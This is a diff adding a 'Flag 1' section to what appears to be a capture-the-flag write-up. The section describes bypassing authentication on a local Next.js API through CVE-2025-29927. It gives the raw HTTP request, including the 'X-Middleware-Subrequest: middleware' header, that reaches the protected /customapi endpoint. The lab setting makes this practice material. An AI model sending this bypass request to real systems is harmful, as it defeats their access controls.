@@ -110,3 +110,12 @@ ________________________________________________
 
 11. There is a Hidden API Here, But Accessing `http://127.0.0.1:10000/customapi` needs **Authentication** as the Image above says it loud and clear! 👂
 
+## Flag 1 ⛳️
+
+12. By Checking HTML, It seems the website is based on `Next.JS`. First vulnerability to check is [CVE-2025-29927](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass). We can this security issue by sending request below: 🧨
+```
+GET /customapi HTTP/1.1
+Host:127.0.0.1:10000
+X-Middleware-Subrequest: middleware
+```
+
